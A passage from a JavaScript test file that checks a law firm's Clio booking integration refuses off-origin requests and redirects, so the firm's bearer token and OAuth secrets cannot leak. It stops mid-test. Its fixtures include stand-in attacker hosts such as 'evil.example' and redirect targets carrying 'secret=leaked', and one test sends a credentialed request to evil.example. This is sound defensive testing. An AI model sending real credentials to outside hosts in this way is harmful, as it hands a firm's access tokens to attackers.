// ── ORDER SHELDON-BOOKING-SINK ───────────────────────────────────────────────
//
// Zane's gate on bfebc68 returned PASS-WITH-CONDITIONS with no blockers. These are
// the two conditions, and both are about the same thing: SHELDON-BOOKING-ORIGIN put
// its origin check at the two CALL SITES, and a call-site check is a check the next
// call site does not inherit.
//
// CONDITION 1 — THE GUARD WAS NOT AT THE CREDENTIALED SINK. clioFetch still attached
// `Authorization: Bearer <the firm's Clio access token>` to any absolute URL it was
// handed, and the read-only transport in provider-clio.js still forwarded any path
// beginning with "http" to it verbatim. So a third walk written next year, reading a
// raw `meta.paging.next` the way both existing walks used to, reintroduced the
// identical defect with no test failing. bfebc68's own comment said as much — "a
// third walk that reads a raw meta.paging.next is now the thing that stands out in
// review" — which is a review control, not a code control. The check now also sits
// inside clioFetch (assertClioOrigin, clio-paging.js), keyed on the presence of an
// Authorization header rather than on the `_skipAuth` flag.
//
// CONDITION 2 — REDIRECTS WERE UNGUARDED. `fetch` follows redirects by default, so
// the host clioFetch checked and the host it finally talked to were two different
// things, decided by a `Location` header — a string out of a Clio response, exactly
// as trusted as the `next` cursor in a Clio response BODY that this whole line of
// work exists because of. An admitted same-origin cursor answering `302` to another
// host was a hop no check on this branch could see, and nothing simulated one.
// clioFetch now sets `redirect: "manual"` and treats a 3xx as a refusal naming the
// Location host.
//
// ── WHAT THIS FILE PROVES ────────────────────────────────────────────────────
//   • THE SINK IS A DIFFERENT CHECK FROM THE CALL SITES, and one test here can only
//     be satisfied by it: the read-only transport is handed an off-origin absolute
//     path DIRECTLY — the third walk, written by hand — without ever consulting
//     nextPageUrl. Revert assertClioOrigin's call in clioFetch and that test fails
//     while every call-site test on this branch stays green.
//   • THE TOKEN MINT STILL PASSES, asserted three ways, because a false positive
//     there stops every booking rather than degrading one.
//   • A REDIRECT IS A REFUSAL, named by Location host, with no hop issued: for a
//     same-origin cursor that 302s off-host, for a look-alike Location, for a
//     same-host Location, for a Location that is missing, and on the token mint —
//     where following one would hand over `client_secret` and `refresh_token`.
//   • THE CALL SITES STILL BEHAVE EXACTLY AS GATED — calendar rethrows to 502 with
//     no write, custom fields return a failed list and the booking still completes
//     with the intake answers on the note.
//
// ── THE REDIRECT-FOLLOWING STUB, AND WHY IT STRIPS THE HEADER ────────────────
//
// A test that proves a redirect is refused has to model what following one would
// have done, or "no hop happened" is true of a stub that could not hop. So this
// file's stub FOLLOWS a 3xx when the request did not ask for `manual`, exactly as a
// runtime does — and by default it DROPS the Authorization header across an origin
// change, because that is what the WHATWG fetch algorithm specifies and what the
// Node fetch this suite runs on actually does.
//
// That is the conservative choice and it costs this file its loudest assertion: with
// the header stripped, reverting `redirect: "manual"` does NOT trip the credentialed-
// egress tripwire, so the tripwire alone cannot prove the redirect guard. The
// assertions that DO discriminate are stated instead — no request reached the foreign
// host at all, no calendar entry was written, and the route answered 502 rather than
// the 201 a followed redirect produces. The tripwire is asserted alongside them
// because the order asks for it and because it is the thing that must never regress.
//
// One test then models the OTHER runtime — `keepAuthAcrossRedirect`, a fetch that
// forwards the header across the hop. Cloudflare Workers is a different
// implementation from Node's and nothing in this repo pins its behaviour, so the
// refusal is proven under both readings rather than resting on either.
//
// ── WHAT IT CANNOT PROVE — no assertion below claims it ──────────────────────
//   • that Clio has ever answered a 3xx on any endpoint this integration calls. The
//     vendored research records exactly one redirecting Clio endpoint —
//     GET /documents/:id/download, a 303 — and this repo has no caller for it. These
//     are the shapes the failure would arrive in, stubbed.
//   • what the Cloudflare Workers fetch does with an Authorization header across a
//     cross-origin redirect. Both readings are modelled; neither is asserted as fact.
//   • that `meta.paging.next` is contractual. It is not, as bfebc68 records at length.
//
// The harness below is deliberately a COPY of the one in clio-next-origin.test.mjs
// rather than an extraction of it. That file is the proof bfebc68 was gated on; it is
// left byte-identical so its 24 assertions still say what they said, and the cost is
// a duplicated stub.

import { test, describe, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import { onRequestPost as bookingCreate } from '../donovan-legal-site/functions/booking/create.js';
import { __resetIntakeFieldCache } from '../donovan-legal-site/functions/booking/_lib/clio-custom-fields.js';
import { clioReadApi } from '../donovan-legal-site/functions/booking/_lib/provider-clio.js';
import { resolveConfig } from '../donovan-legal-site/functions/booking/_lib/config.js';
import {
  assertClioOrigin, CLIO_BASE, CLIO_ORIGIN,
} from '../donovan-legal-site/functions/booking/_lib/clio-paging.js';
import { stubFetch, muteConsole, makeKV, makeDurableObject } from './helpers/stubs.mjs';

const SITEVERIFY     = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
const CLIO_TOKEN     = 'https://app.clio.com/oauth/token';
const CLIO_ENTRIES   = 'https://app.clio.com/api/v4/calendar_entries';
const CLIO_CONTACTS  = 'https://app.clio.com/api/v4/contacts';
const CLIO_CFIELDS   = 'https://app.clio.com/api/v4/custom_fields';
const CLIO_NOTES     = 'https://app.clio.com/api/v4/notes';
const GROW_INBOX     = 'https://grow.clio.com/inbox_leads';
const VANTAGE_UPSERT = 'https://vantage.ticoai.net/upsert-lead';

/** The page size provider-clio.js asks for — the contract's documented maximum. */
const PAGE_LIMIT = 200;

const EVIL_HOST = 'evil.example';

/**
 * The Location an attacker would like followed, and the query it would like logged.
 *
 * `secret=leaked` is not decoration: the refusal names a HOST and must not name the
 * URL, on the same reasoning bfebc68 applied to the cursor — our own calendar URL
 * carries the firm's calendar id and the window it was read over, and the attacker's
 * carries whatever it chose.
 */
const EVIL_LOCATION = `https://${EVIL_HOST}/api/v4/calendar_entries?page_token=pwned&secret=leaked`;

/** Contains the Clio origin as a prefix and is a different site. */
const LOOKALIKE_HOST = 'app.clio.com.evil.example';
const LOOKALIKE_LOCATION = `https://${LOOKALIKE_HOST}/api/v4/calendar_entries?page_token=p1`;

/**
 * A fresh client id per environment.
 *
 * provider-clio.js caches the access token per isolate, KEYED BY client_id, and a
 * test file is one isolate — so a shared id means the first test mints and every
 * test after it is served from cache. That is invisible until you assert ON the
 * mint, which this file does three times: without a fresh key those assertions
 * would be reading the first test's traffic, and the token-redirect test would
 * never reach the mint at all.
 */
let _cidSeq = 0;
const freshClientId = () => `sink-cid-${(_cidSeq += 1)}`;

function env(over = {}) {
  return {
    TURNSTILE_SECRET_KEY: 'test-secret',
    CLIO_CLIENT_ID: freshClientId(),
    CLIO_CLIENT_SECRET: 'csec',
    CLIO_REFRESH_TOKEN: 'rtok',
    CLIO_CALENDAR_ID: 9084638,
    CLIO_CREATE_CONTACT: '1',
    ...over,
  };
}

/** A weekday slot inside the firm's 9–17 ET window, a week out. */
function futureMondaySlot() {
  const d = new Date(Date.now() + 7 * 86400_000);
  d.setUTCHours(14, 0, 0, 0);
  while (d.getUTCDay() !== 1) d.setUTCDate(d.getUTCDate() + 1);
  return d.toISOString();
}
const SLOT = futureMondaySlot();
const SLOT_MS = Date.parse(SLOT);

const entryAt = (startMs, mins = 30) => ({
  start_at: new Date(startMs).toISOString(),
  end_at:   new Date(startMs + mins * 60_000).toISOString(),
});

/** `n` entries that are NOT at SLOT, so nothing here can take the slot by accident. */
const filler = (n) => Array.from({ length: n }, (_, i) => entryAt(SLOT_MS - 14 * 86400_000 + i * 3600_000));

/** The firm's own next-page URL — an ADMITTED cursor, which is the point of it here. */
const sameHostNext = (n) => `${CLIO_ENTRIES}?page_token=p${n}`;

function pageBody(entries, next) {
  const body = { data: entries };
  if (typeof next === 'number') body.meta = { paging: { next: sameHostNext(next) } };
  else if (next !== undefined) body.meta = { paging: { next } };
  return JSON.stringify(body);
}

const CALL_ID = 'call-sink-0001';
const INTAKE = {
  matter_category: 'Real estate',
  matter_sub:      'Acquisition',
  for_whom:        'Yourself (personal)',
  income_band:     '$1.5M–$3M',
  net_worth_band:  '$5M–$15M',
  language:        'English',
  source:          'Referred by a client',
};

function kvWithQualifier() {
  return makeKV({
    [`qualbk:${CALL_ID}`]: JSON.stringify({
      summary: '— Perch intake —\nMatter: Real estate', intake: INTAKE, state: 'FL', matter: 'real_estate',
    }),
  });
}
function bridgeWithQualifier() {
  const ns = makeDurableObject();
  ns.instance('donovan').state.set(`qual:${CALL_ID}`, { status: 'complete' });
  return ns;
}

/** Read an Authorization value off whatever header shape the caller built. */
function authOf(init) {
  const h = init?.headers;
  if (!h) return '';
  if (typeof h.get === 'function') return h.get('authorization') ?? '';
  if (Array.isArray(h)) {
    const row = h.find(([k]) => String(k).toLowerCase() === 'authorization');
    return row ? String(row[1]) : '';
  }
  const key = Object.keys(h).find((k) => k.toLowerCase() === 'authorization');
  return key ? String(h[key]) : '';
}

/** The same header shapes, minus Authorization — what a spec-conformant hop sends. */
function withoutAuth(init) {
  const h = init?.headers;
  if (!h) return init;
  if (typeof h.get === 'function') {
    const copy = new Headers(h);
    copy.delete('authorization');
    return { ...init, headers: copy };
  }
  if (Array.isArray(h)) {
    return { ...init, headers: h.filter(([k]) => String(k).toLowerCase() !== 'authorization') };
  }
  const copy = { ...h };
  for (const k of Object.keys(copy)) if (k.toLowerCase() === 'authorization') delete copy[k];
  return { ...init, headers: copy };
}

/**
 * Stub every edge a booking touches, with the egress tripwire in front of it AND a
 * redirect-following runtime behind it.
 *
 * `entryRedirects` / `cfRedirects` / `tokenRedirect` make a request that would
 * otherwise have answered a page answer a 3xx instead. Keyed by page index, so a
 * redirect can be placed on the SECOND calendar read — the one reached through a
 * cursor nextPageUrl already admitted, which is the hop bfebc68's check cannot see.
 *
 * FOLLOWING IS EMULATED, NOT ASSUMED AWAY. A 3xx whose request did not ask for
 * `manual` is followed to its Location, and the Authorization header is dropped
 * across an origin change per the fetch algorithm — unless `keepAuthAcrossRedirect`
 * models a runtime that keeps it. Every hop is recorded in `seen.followed`, which is
 * empty on a build that refuses and non-empty on one that does not: that list is the
 * discriminator this file's redirect tests turn on.
 */
function stubAll({
  pages = [pageBody([])],
  cfPages = [JSON.stringify({ data: [] })],
  contactSearchBody = '{"data":[]}',
  entryRedirects = {},
  cfRedirects = {},
  tokenRedirect = null,
  keepAuthAcrossRedirect = false,
} = {}) {
  const seen = {
    requests: [], credentialedEgress: [], offHost: [], followed: [],
    reads: [], cfReads: [], redirectModes: [],
    entryPosts: [], contactPosts: [], patches: [], notes: [], tokens: [],
  };

  const redirectTo = (location, status = 302) =>
    new Response(null, location === null
      ? { status }
      : { status, headers: { Location: location } });

  /** One request, recorded and answered. No redirect following happens in here. */
  const dispatch = async (u, init) => {
    const method = init?.method ?? 'GET';
    const credentialed = authOf(init) !== '';
    let origin = '', host = '';
    try { const p = new URL(u); origin = p.origin; host = p.host; } catch (_) { /* recorded blank */ }

    seen.requests.push({ url: u, host, method, credentialed, redirect: init?.redirect ?? 'follow' });
    seen.redirectModes.push(init?.redirect ?? 'follow');
    if (origin !== CLIO_ORIGIN) {
      seen.offHost.push({ host, method, credentialed });
      if (credentialed) seen.credentialedEgress.push({ host, method, url: u });
    }

    if (u === SITEVERIFY) return new Response(JSON.stringify({ success: true }));

    if (u.startsWith(CLIO_TOKEN)) {
      seen.tokens.push({ url: u, credentialed, body: init?.body ?? '' });
      if (tokenRedirect !== null) return redirectTo(tokenRedirect);
      return new Response(JSON.stringify({ access_token: `at-${seen.tokens.length}` }));
    }

    if (u.startsWith(CLIO_ENTRIES) && method === 'GET') {
      const token = new URL(u).searchParams.get('page_token');
      const idx = token ? Number(token.slice(1)) : 0;
      seen.reads.push(idx);
      if (idx in entryRedirects) return redirectTo(entryRedirects[idx]);
      return new Response(pages[idx] ?? pageBody([]), { status: 200 });
    }
    if (u.startsWith(CLIO_ENTRIES) && method === 'POST') {
      seen.entryPosts.push(JSON.parse(init.body));
      return new Response(JSON.stringify({ data: { id: 999999 } }), { status: 201 });
    }

    if (u.startsWith(CLIO_CFIELDS) && method === 'GET') {
      const token = new URL(u).searchParams.get('page_token');
      const idx = token ? Number(token.slice(1)) : 0;
      seen.cfReads.push(idx);
      if (idx in cfRedirects) return redirectTo(cfRedirects[idx]);
      return new Response(cfPages[idx] ?? JSON.stringify({ data: [] }));
    }

    if (u.startsWith(`${CLIO_CONTACTS}/`) && method === 'PATCH') {
      seen.patches.push(JSON.parse(init.body));
      return new Response(JSON.stringify({ data: { id: 4242 } }));
    }
    if (u.startsWith(CLIO_CONTACTS) && method === 'GET') return new Response(contactSearchBody);
    if (u.startsWith(CLIO_CONTACTS) && method === 'POST') {
      seen.contactPosts.push(JSON.parse(init.body));
      return new Response(JSON.stringify({ data: { id: 4242 } }));
    }
    if (u.startsWith(CLIO_NOTES) && method === 'POST') {
      seen.notes.push(JSON.parse(init.body));
      return new Response(JSON.stringify({ data: { id: 77 } }));
    }

    if (u.startsWith(GROW_INBOX)) return new Response(JSON.stringify({ ok: true }));
    if (u.startsWith(VANTAGE_UPSERT)) return new Response(JSON.stringify({ ok: true }));

    // Anywhere else — INCLUDING a followed Location. A well-formed, complete, EMPTY
    // last page, so a build that follows the hop completes the walk and returns 201.
    // That is the discrimination: refusing answers 502, following answers 201.
    return new Response(JSON.stringify({ data: [] }), { status: 200 });
  };

  const handle = stubFetch(async (url, init) => {
    let u = String(url);
    let i = init;
    for (let hops = 0; hops < 5; hops += 1) {
      const res = await dispatch(u, i);
      if (res.status < 300 || res.status >= 400) return res;
      if ((i?.redirect ?? 'follow') === 'manual') return res;   // handed back, unfollowed

      const loc = res.headers.get('location');
      if (!loc) return res;                                     // nothing to follow
      let target;
      try { target = new URL(loc, u).toString(); } catch (_) { return res; }

      const crossOrigin = new URL(target).origin !== new URL(u).origin;
      if (crossOrigin && !keepAuthAcrossRedirect) i = withoutAuth(i);
      seen.followed.push({
        to: new URL(target).host, credentialed: authOf(i) !== '', status: res.status,
      });
      u = target;
    }
    return new Response(JSON.stringify({ data: [] }), { status: 200 });
  });

  return { seen, restore: () => handle.restore() };
}

/**
 * The tripwire assertion, with the arms that stop it being vacuous — as bfebc68.
 *
 * It is asserted in this file's redirect tests because the order asks for it and
 * because it must never regress, NOT because it is what discriminates there. See the
 * header: with a spec-conformant hop the header is stripped, so `seen.followed` and
 * the route status are what tell a refusing build from a following one.
 */
function assertNoCredentialedEgress(seen, { expectOffHost = true } = {}) {
  assert.ok(
    seen.requests.some((r) => r.credentialed),
    'a credentialed request WAS issued — there was a token on this path to leak',
  );
  if (expectOffHost) {
    assert.ok(seen.offHost.length > 0, 'off-host traffic DID occur — the tripwire had something to see');
  }
  assert.deepEqual(
    seen.credentialedEgress, [],
    `a bearer-credentialed request left the Clio origin: ${JSON.stringify(seen.credentialedEgress)}`,
  );
}

let _ipSeq = 0;
const nextIp = () => `203.0.113.${(_ipSeq += 1) % 250}`;

function post(over = {}) {
  return new Request('https://www.donovan.law/booking/create', {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'CF-Connecting-IP': nextIp() },
    body: JSON.stringify({
      type: 'consult',
      slot: SLOT,
      name: 'Jane Q Caller',
      email: 'jane.caller@example.com',
      phone: '(561) 555-0142',
      turnstile_token: 'good-token',
      ...over,
    }),
  });
}

async function book(envOver = {}, bodyOver = {}) {
  return bookingCreate({
    request: post(bodyOver),
    env: env({ PERCH_ACTIONS: makeKV(), PERCH_BRIDGE: makeDurableObject(), ...envOver }),
  });
}

/** A booking that carries a verified qualifier, so the /custom_fields walk runs. */
async function bookWithIntake(envOver = {}) {
  return bookingCreate({
    request: post({ call_id: CALL_ID }),
    env: env({ PERCH_ACTIONS: kvWithQualifier(), PERCH_BRIDGE: bridgeWithQualifier(), ...envOver }),
  });
}

/**
 * The read-only transport, built from the REAL production cfg.
 *
 * One `env` object for both halves, so the cfg and the secrets it resolves against
 * agree on a single client id — see freshClientId.
 */
function readApi() {
  const e = env();
  return clioReadApi(resolveConfig(e).config, e);
}

let stub, mute;
beforeEach(() => { __resetIntakeFieldCache(); mute = muteConsole(); });
afterEach(() => { stub?.restore(); mute.restore(); });

// ─────────────────────────────────────────────────────────────────────────────
// 0. The tripwire and the follower, before anything is asserted with either
// ─────────────────────────────────────────────────────────────────────────────
describe('this file’s instruments are not inert', () => {
  test('THE TRIPWIRE FIRES: a credentialed off-host request IS recorded', async () => {
    stub = stubAll();
    await globalThis.fetch(`https://${EVIL_HOST}/x`, {
      headers: { Authorization: 'Bearer would-be-the-firms-token' },
    });

    assert.equal(stub.seen.credentialedEgress.length, 1);
    assert.equal(stub.seen.credentialedEgress[0].host, EVIL_HOST);
  });

  test('…and ordinary Clio traffic is credentialed but not flagged', async () => {
    stub = stubAll();
    await book();

    assertNoCredentialedEgress(stub.seen);
    assert.ok(stub.seen.requests.some((r) => r.host === 'app.clio.com' && r.credentialed));
  });

  test('THE FOLLOWER FOLLOWS: a 3xx without `manual` is hopped, and recorded', async () => {
    // Fired by hand. Without this, every "no hop occurred" assertion below would be
    // equally satisfied by a stub that cannot hop at all — which is the whole failure
    // mode of proving a negative with an instrument nobody tested.
    stub = stubAll({ entryRedirects: { 0: EVIL_LOCATION } });
    const res = await globalThis.fetch(`${CLIO_ENTRIES}?x=1`, {
      headers: { Authorization: 'Bearer t' },
    });

    assert.equal(res.status, 200, 'the follower resolved to the Location’s response');
    assert.deepEqual(stub.seen.followed.map((h) => h.to), [EVIL_HOST]);
    assert.ok(stub.seen.requests.some((r) => r.host === EVIL_HOST), 'the foreign host WAS reached');
  });

  test('…and the hop drops Authorization across an origin change, as the algorithm says', async () => {
    // The conservative reading, stated as an assertion rather than left implied. It
    // is why the tripwire is NOT what discriminates the redirect tests below.
    stub = stubAll({ entryRedirects: { 0: EVIL_LOCATION } });
    await globalThis.fetch(`${CLIO_ENTRIES}?x=1`, { headers: { Authorization: 'Bearer t' } });

    assert.equal(stub.seen.followed[0].credentialed, false, 'the header did not ride along');
    assert.deepEqual(stub.seen.credentialedEgress, [], 'so the tripwire stays silent even on a real hop');
  });

  test('…unless the runtime is modelled as keeping it, which some do', async () => {
    stub = stubAll({ entryRedirects: { 0: EVIL_LOCATION }, keepAuthAcrossRedirect: true });
    await globalThis.fetch(`${CLIO_ENTRIES}?x=1`, { headers: { Authorization: 'Bearer t' } });

    assert.equal(stub.seen.followed[0].credentialed, true);
    assert.equal(stub.seen.credentialedEgress.length, 1, 'and THEN the hop is a token handout');
  });

  test('…and `manual` is handed the 3xx back, unfollowed', async () => {
    stub = stubAll({ entryRedirects: { 0: EVIL_LOCATION } });
    const res = await globalThis.fetch(`${CLIO_ENTRIES}?x=1`, { redirect: 'manual' });

    assert.equal(res.status, 302);
    assert.equal(res.headers.get('location'), EVIL_LOCATION, 'and the Location IS readable');
    assert.deepEqual(stub.seen.followed, []);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 1. TASK 1 — the guard is at the sink, and that is a different check
// ─────────────────────────────────────────────────────────────────────────────
describe('the credentialed sink refuses an off-origin target', () => {
  test('THE DISCRIMINATOR: the read-only transport refuses an absolute off-origin path', async () => {
    // THE THIRD WALK, WRITTEN BY HAND. This is the passthrough Zane's review named:
    // `path.startsWith("http")` forwards an absolute URL to clioFetch verbatim, and
    // nothing on the way consults nextPageUrl. Revert the assertClioOrigin call in
    // clioFetch and this test fails — the firm's bearer token reaches evil.example —
    // while every call-site test on this branch stays green, because no call site is
    // involved. That is the whole of condition 1.
    stub = stubAll();
    const api = readApi();

    await assert.rejects(
      () => api.get(`https://${EVIL_HOST}/api/v4/custom_fields?secret=leaked`),
      (e) => e.message.includes(`refused host ${EVIL_HOST}`),
      'the sink refused, naming the host',
    );

    assert.deepEqual(stub.seen.credentialedEgress, [], 'no bearer token left the Clio origin');
    assert.equal(
      stub.seen.requests.some((r) => r.host === EVIL_HOST), false,
      'the request was refused BEFORE dispatch — the attacker host saw nothing at all',
    );
    assert.ok(stub.seen.tokens.length > 0, 'and there was a live token to have leaked');
  });

  test('the refusal is warned, so a caller that swallows the throw is not silent', async () => {
    // intakeFieldIds catches everything into `{}` by contract. Without the warn at
    // the sink, the one event worth alerting on would be the quietest in the log.
    stub = stubAll();
    const api = readApi();
    await assert.rejects(() => api.get(`https://${EVIL_HOST}/api/v4/custom_fields?secret=leaked`));

    assert.ok(mute.saw('request refused before dispatch'), 'greppable, in its own words');
    assert.ok(mute.saw(`refused host ${EVIL_HOST}`), 'and the host is named');
    assert.equal(mute.saw('secret=leaked'), false, 'the target’s query is NOT echoed into our stream');
  });

  test('a LOOK-ALIKE host is refused at the sink too — origin, not prefix', async () => {
    stub = stubAll();
    const api = readApi();

    await assert.rejects(
      () => api.get(`https://${LOOKALIKE_HOST}/api/v4/custom_fields`),
      (e) => e.message.includes(`refused host ${LOOKALIKE_HOST}`),
    );
    assert.equal(stub.seen.requests.some((r) => r.host === LOOKALIKE_HOST), false);
  });

  test('an http:// downgrade of the RIGHT hostname is refused at the sink', async () => {
    // A host comparison waves this through and puts the bearer token on the wire in
    // clear text. The sink compares origins for the same reason nextPageUrl does.
    stub = stubAll();
    const api = readApi();

    await assert.rejects(
      () => api.get('http://app.clio.com/api/v4/custom_fields'),
      (e) => e.message.includes('refused host app.clio.com'),
    );
    assert.equal(stub.seen.requests.some((r) => r.url.startsWith('http://')), false, 'no cleartext request issued');
  });

  test('a target carrying URL credentials is refused even on the right origin', async () => {
    stub = stubAll();
    const api = readApi();

    await assert.rejects(
      () => api.get('https://user:pw@app.clio.com/api/v4/custom_fields'),
      /carrying credentials/,
    );
  });

  test('THE NARROWING: a legitimate absolute Clio URL still goes through the transport', async () => {
    // Without this the refusals above would also be satisfied by a sink that refused
    // every absolute path — which would break the walk the passthrough exists for.
    stub = stubAll();
    const api = readApi();

    const res = await api.get(`${CLIO_CFIELDS}?page_token=p1`);
    assert.equal(res.status, 200);
    assert.deepEqual(stub.seen.cfReads, [1], 'and it reached the custom-field handler');
  });

  test('…and a relative path still joins CLIO_BASE, as it always did', async () => {
    stub = stubAll();
    const api = readApi();

    const res = await api.get('/custom_fields?parent_type=contact');
    assert.equal(res.status, 200);
    assert.ok(
      stub.seen.requests.some((r) => r.url === `${CLIO_BASE}/custom_fields?parent_type=contact`),
      'joined onto the one CLIO_BASE, not re-spelled',
    );
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 2. TASK 2 — the token mint still passes the assertion
// ─────────────────────────────────────────────────────────────────────────────
describe('the OAuth token mint still passes the sink assertion', () => {
  test('a false positive here would stop every booking — it does not', async () => {
    // The mint is upstream of every other call in the file: if the assertion refused
    // it, no booking could obtain a token and the fix would be an outage rather than
    // a control. Asserted at the outcome, not at the shape.
    stub = stubAll({ pages: [pageBody(filler(5))] });
    const res = await book();

    assert.equal(res.status, 201, 'the booking completed');
    assert.ok(stub.seen.tokens.length > 0, 'and it minted a token to complete it with');
    assert.equal(mute.saw('request refused before dispatch'), false, 'nothing was refused at the sink');
    assert.equal(stub.seen.entryPosts.length, 1);
  });

  test('the mint’s own URL satisfies the assertion directly', async () => {
    // NOT passing merely because it is uncredentialed: CLIO_TOKEN_URL is on the Clio
    // origin, so it would pass the check even if the mint ever started carrying a
    // header. Asserted so a future change to that request cannot silently rely on the
    // flag instead.
    assert.doesNotThrow(() => assertClioOrigin(CLIO_TOKEN, 'POST token'));
    assert.equal(new URL(CLIO_TOKEN).origin, CLIO_ORIGIN, 'the mint and the API share one origin');
  });

  test('and the mint carries no Authorization header, which is why the check skips it', async () => {
    // The `_skipAuth` fact, recorded as an observation of the REQUEST rather than of
    // the source: the sink keys on the header, so this is what makes it a no-op there.
    stub = stubAll({ pages: [pageBody(filler(5))] });
    await book();

    assert.ok(stub.seen.tokens.length > 0);
    assert.equal(stub.seen.tokens.every((t) => t.credentialed === false), true, 'no bearer on the mint');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// 3. TASKS 3 & 4 — a redirect is a refusal, and no hop is issued
// ─────────────────────────────────────────────────────────────────────────────
describe('an admitted same-origin cursor that answers 302 to another host', () => {
  /**
   * Page one is full and names the firm's OWN next-page URL, so nextPageUrl admits
   * the cursor — there is nothing wrong with it. The refusal has to come from the
   * hop, which is the condition: the check bfebc68 shipped never sees this.
   */
  const redirectingSecondPage = (location) => ({
    pages: [pageBody(filler(PAGE_LIMIT), 1)],
    entryRedirects: { 1: location },
  });

  test('THE CONTROL: no hop is issued, and the walk fails closed', async () => {
    stub = stubAll(redirectingSecondPage(EVIL_LOCATION));
    const res = await book();

    // The discriminators. Remove `redirect: "manual"` from clioFetch and all three
    // flip: the hop is followed, evil.example answers a clean empty last page, the
    // walk completes and the route answers 201.
    assert.deepEqual(stub.seen.followed, [], 'no redirect was followed');
    assert.equal(
      stub.seen.requests.some((r) => r.host === EVIL_HOST), false,
      'the foreign host was never contacted',
    );
    assert.equal(res.status, 502, 'and the walk refuses, as every unfinished walk here does');
    assert.equal((await res.json()).code, 'PROVIDER_ERROR');

    // Asserted alongside, per the order. It holds on a following build too when the
    // runtime strips the header — see the file header for why it is not the control.
    assertNoCredentialedEgress(stub.seen);
  });

  test('…and nothing is written onto a calendar we refused to finish reading', async () => {
    stub = stubAll(redirectingSecondPage(EVIL_LOCATION));
    await book();

    assert.deepEqual(stub.seen.entryPosts, [], 'no calendar entry');
    assert.deepEqual(stub.seen.reads, [0, 1], 'page one read, page two asked for and refused');
  });

  test('the refusal names the LOCATION host, and never either URL', async () => {
    stub = stubAll(redirectingSecondPage(EVIL_LOCATION));
    await book();

    assert.ok(mute.saw('answered HTTP 302'), 'the status is stated');
    assert.ok(mute.saw(`refused redirect to host ${EVIL_HOST}`), 'and the host an operator alerts on');
    assert.equal(mute.saw('secret=leaked'), false, 'the Location query is NOT echoed');
    assert.equal(mute.saw('page_token=pwned'), false);
    assert.equal(mute.saw('calendar_id'), false, 'nor our own query, which carries the firm’s calendar id');
    // Distinct from every other refusal on this path, or an operator cannot tell a
    // redirect from a truncated page or an off-origin cursor.
    assert.equal(mute.saw('refused a next page cursor'), false);
    assert.equal(mute.saw('full page with no next page'), false);
    assert.equal(mute.saw('calendar entries read:'), false);
  });

  test('a LOOK-ALIKE Location is refused — the hop is not compared by prefix either', async () => {
    stub = stubAll(redirectingSecondPage(LOOKALIKE_LOCATION));
    const res = await book();

    assert.deepEqual(stub.seen.followed, []);
    assert.equal(stub.seen.requests.some((r) => r.host === LOOKALIKE_HOST), false);
    assert.equal(res.status, 502);
    assert.ok(mute.saw(`refused redirect to host ${LOOKALIKE_HOST}`));
    assertNoCredentialedEgress(stub.seen);
  });

  test('ON A RUNTIME THAT KEEPS THE HEADER, the refusal is what stops the handout', async () => {
    // The other reading of the fetch algorithm, modelled rather than argued about.
    // Here the tripwire IS the discriminator: remove `manual` and a bearer-
    // credentialed request lands on evil.example.
    stub = stubAll({ ...redirectingSecondPage(EVIL_LOCATION), keepAuthAcrossRedirect: true });
    const res = await book();

    assertNoCredentialedEgress(stub.seen);
    assert.deepEqual(stub.seen.followed, []);
    assert.equal(res.status, 502);
  });

  test('a SAME-HOST Location is refused too — "same host" is not "not a redirect"', async () => {
    // A 302 to app.clio.com is still a hop this integration did not decide to make,
    // and admitting it would make the guard a host check on the Location instead of a
    // refusal to follow. Refusing it costs nothing: nothing here redirects.
    stub = stubAll(redirectingSecondPage(sameHostNext(2)));
    const res = await book();

    assert.deepEqual(stub.seen.followed, []);
    assert.equal(res.status, 502);
    assert.ok(mute.saw('refused redirect to host app.clio.com'));
    assert.deepEqual(stub.seen.entryPosts, []);
  });

  test('a RELATIVE Location is refused, and still yields a host to name', async () => {
    stub = stubAll(redirectingSecondPage('/api/v4/calendar_entries?page_token=p9'));
    const res = await book();

    assert.equal(res.status, 502);
    assert.ok(mute.saw('refused redirect to host app.clio.com'), 'resolved against the request URL');
    assert.deepEqual(stub.seen.followed, []);
  });

  test('a 3xx carrying NO Location is refused, and says which fact it has', async () => {
    // The runtime dependency the order flagged. If a runtime ever hides the Location
    // on a manual redirect, this is the branch that fires — and it is still a refusal,
    // so the guard degrades closed rather than to a hop.
    stub = stubAll(redirectingSecondPage(null));
    const res = await book();

    assert.equal(res.status, 502);
    assert.ok(mute.saw('refused a redirect carrying no Location header'));
    assert.deepEqual(stub.seen.followed, []);
  });

  test('the credentialed calendar read is DISPATCHED in manual redirect mode', async () => {
    // Read off the request the runtime actually received, not off the source. A build
    // that set the option somewhere that does not reach fetch fails here.
    stub = stubAll({ pages: [pageBody(filler(5))] });
    await book();

    const calendarReads = stub.seen.requests.filter(
      (r) => r.url.startsWith(CLIO_ENTRIES) && r.method === 'GET',
    );
    assert.ok(calendarReads.length > 0);
    assert.equal(calendarReads.every((r) => r.redirect === 'manual'), true);
    assert.equal(
      stub.seen.requests.filter((r) => r.host === 'app.clio.com').every((r) => r.redirect === 'manual'),
      true,
      'every Clio request, including the mint and the writes',
    );
  });

  test('THE NARROWING: an ordinary 200 walk still books through both pages', async () => {
    // Without this, "refuse 3xx" would be satisfied equally by a build that refused
    // everything. 133's proof of walk, restated with the redirect guard in place.
    stub = stubAll({ pages: [pageBody(filler(PAGE_LIMIT), 1), pageBody(filler(3))] });
    const res = await book();

    assert.equal(res.status, 201);
    assert.deepEqual(stub.seen.reads, [0, 1]);
    assert.equal(stub.seen.entryPosts.length, 1);
    assert.equal(mute.saw('answered HTTP'), false, 'no redirect refusal fired on a clean walk');
  });
});

describe('a redirect on the other credentialed calls', () => {
  test('ON THE TOKEN MINT: refused — following it would hand over the client secret', async () => {
    // The mint body carries `client_secret` and `refresh_token`. Following a 302 from
    // it is a credential handout that no Authorization-header test would ever see,
    // which is why the redirect refusal is not conditioned on the header the way the
    // origin assertion is.
    stub = stubAll({ tokenRedirect: EVIL_LOCATION });
    const res = await book();

    assert.deepEqual(stub.seen.followed, [], 'the mint did not hop');
    assert.equal(
      stub.seen.requests.some((r) => r.host === EVIL_HOST), false,
      'and the secret never reached the foreign host',
    );
    assert.equal(res.status, 502, 'no token, no booking — fail closed');
    assert.ok(mute.saw(`refused redirect to host ${EVIL_HOST}`));
